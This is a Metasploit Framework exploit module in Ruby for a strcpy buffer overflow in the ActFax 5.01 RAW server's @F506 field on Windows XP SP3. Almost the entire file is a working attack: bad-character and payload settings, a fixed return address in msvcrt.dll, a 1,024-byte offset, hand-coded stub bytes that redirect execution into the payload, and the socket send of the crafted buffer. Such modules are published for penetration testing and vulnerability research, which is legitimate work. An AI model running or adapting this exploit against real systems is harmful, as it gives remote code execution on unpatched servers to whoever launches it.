##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote

  Rank = NormalRanking

  include Msf::Exploit::Remote::Tcp

  def initialize(info = {})
    super(update_info(info,
      'Name'    => 'ActFax 5.01 RAW Server Buffer Overflow',
      'Description'  => %q{
          This module exploits a vulnerability in ActFax Server 5.01 RAW server. The RAW
        Server can be used to transfer fax messages without any underlying protocols. To
        note significant fields in the fax being transferred, like the fax number or the
        recipient, ActFax data fields can be used. This module exploits a buffer overflow
        in the handling of the @F506 fields due to the insecure usage of strcpy. This
        module has been tested successfully on ActFax 5.01 over Windows XP SP3 (English).
      },
      'License'    => MSF_LICENSE,
      'Author'    =>
        [
          'Craig Freyman', # @cd1zz # discovery and Metasploit module
          'corelanc0d3r', # Metasploit module
          'juan vazquez' # Metasploit module cleanup
        ],
      'References'  =>
        [
          [ 'OSVDB', '89944' ],
          [ 'BID', '57789' ],
          [ 'EDB', '24467' ],
          [ 'URL', 'http://www.pwnag3.com/2013/02/actfax-raw-server-exploit.html' ]
        ],
      'Platform'  => 'win',
      'Payload'  =>
        {
          'BadChars' => (0x00..0x1f).to_a.pack("C*") + "\x40",
          'DisableNops' => true,
          'Space' => 1024,
          'EncoderOptions' =>
            {
              'BufferRegister' => 'ECX'
            }
        },
      'Targets'     =>
        [
          [ 'ActFax 5.01 / Windows XP SP3',
            {
              'Ret'     =>  0x77c35459, # push esp # ret # msvcrt.dll
              'Offset'  =>  1024
            }
          ],
        ],
      'Privileged'   => false,
      'DisclosureDate' => 'Feb 5 2013',
      'DefaultTarget'   => 0))

  end

  def exploit
    connect
    p = payload.encoded
    buffer = p
    buffer << rand_text(target['Offset'] - p.length)
    buffer << [target.ret].pack("V")
    buffer << "\x89\xe1" # mov ecx, esp
    buffer << "\x81\xC1\xFC\xFB\xFF\xFF" # add ecx, -1028
    buffer << "\x81\xC4\x6C\xEE\xFF\xFF" # add esp, -4500
    buffer << "\xE9\xE9\xFB\xFF\xFF" # jmp $-1042
    print_status("Trying target #{target.name}...")
    sock.put("@F506 "+buffer+"@\r\n\r\n")
    disconnect
  end
end
